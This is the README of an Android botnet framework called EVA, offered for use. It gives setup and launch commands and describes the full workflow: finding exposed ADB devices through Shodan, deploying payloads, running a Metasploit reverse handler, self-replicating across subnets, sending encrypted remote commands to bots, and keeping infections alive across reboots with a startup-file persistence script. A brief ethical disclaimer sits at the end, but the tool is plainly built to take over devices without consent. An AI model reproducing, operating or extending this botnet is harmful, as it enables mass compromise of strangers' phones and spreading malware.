# Eva_adb_botnet
# EVA ADB Botnet by Team EVA

**Codename:** JEANGREY  
**Platform:** Kali Linux  
**Built with Love by:** x3rx3s, ekomsSavior & m0usem0use
**Purpose:** Ethical cybersecurity research, mesh-based botnet exploration, persistent device control, and integrated mesh command for long-term defense.

---

## What is EVA?

EVA is a fully modular ADB-based Android botnet framework for Kali Linux.

## How to Install (Kali Linux)

```bash
sudo apt update && sudo apt install -y android-tools-adb python3-pip
pip3 install pycryptodome requests
chmod +x ngrok
mkdir -p ~/EVA/bots
cd ~/EVA
```

- Place your EVA repo files inside `~/EVA`
- Add your Shodan API key to `adb_reaper.py`
- Point `adb_dropper.py` to your payload (`adb.apk` or `jeangrey_android.py`)
- Set a strong `SECRET_KEY` (16, 24, or 32 bytes) in `jeangrey_crypto.py`

---

## How to Run EVA (Full Botnet Launch)

```bash
cd ~/EVA
python3 EVA_launcher.py
```

This will:
- Scan Shodan for open ADB devices
- Deploy the payload
- Launch Metasploit reverse handler
- Deploy `jeangrey_android.py` to devices
- Activate mesh networking and peer discovery
- Launch replication loop to infect nearby subnet hosts
- Launch EVA Core for sending encrypted commands
- Launch AI trigger listener for auto-response
- Broadcast EVA presence across the mesh

---

## How to View Active Bots (Live Dashboard)

```bash
python3 eva_dashboard.py
```

This curses-based interface will auto-load `jeangrey_state.json` files from each bot and show their bot_id, IP, tags, and last seen timestamps.

---

## How to Send Commands (Mesh Control via EVA Core)

```bash
python3 eva_core.py
```

Input bot IPs and send commands like:
- `scan` → triggers a subnet scan for new victims
- `drop` → deploys payload to self or others
- `report` → sends back bot state in JSON
- `shutdown` → stops the bot
You can delay execution by X seconds to schedule attacks.

---

## How to Make Bots Respond Autonomously

```bash
python3 eva_ai_trigger.py
```

Each bot listens for encrypted commands and reacts instantly:
- Scans networks
- Drops payloads
- Sends back encrypted state
- Shuts down gracefully when needed
- Executes any command issued by EVA Core

---

## Bot State Tracking + Tags

Each bot writes `bots/bot_<ip>/jeangrey_state.json` including:
- bot_id
- ip address
- join time
- last_seen
- custom tags like ["mesh", "wifi", "replica"]

Tags are displayed in the dashboard and can be modified by EVA Core or AI triggers.

---

## Persistence (Make Bots Survive Reboot)

```bash
adb push jeangrey_persist.sh /sdcard/Download/
adb shell sh /sdcard/Download/jeangrey_persist.sh
```

This script appends `python /sdcard/Download/jeangrey_android.py &` to `~/.bashrc` or relevant startup files so bots automatically rejoin EVA mesh on boot.

---

## Sustaining the Botnet Long-Term

- EVA replicates automatically on each network the infected device joins
- Bots beacon to each other and rebuild mesh even without central command
- EVA Core can be restarted anytime to resume control
- Bots update `last_seen` in their JSON for long-term tracking
- Dashboard allows real-time monitoring of bot activity
- AI listener allows EVA to run passively and react to threats or schedules
- Future expansion may include cloud beaconing, peer relay, GPT triggers, and full EVA voice AI

---

## Ethical Warning

This framework is intended **only** for:
- Personal research
- Lab simulations
- Red team training
- Educational proof-of-concepts

Never use EVA on unauthorized networks or devices. Unauthorized deployment is illegal. You assume full responsibility for ethical and legal use.

---

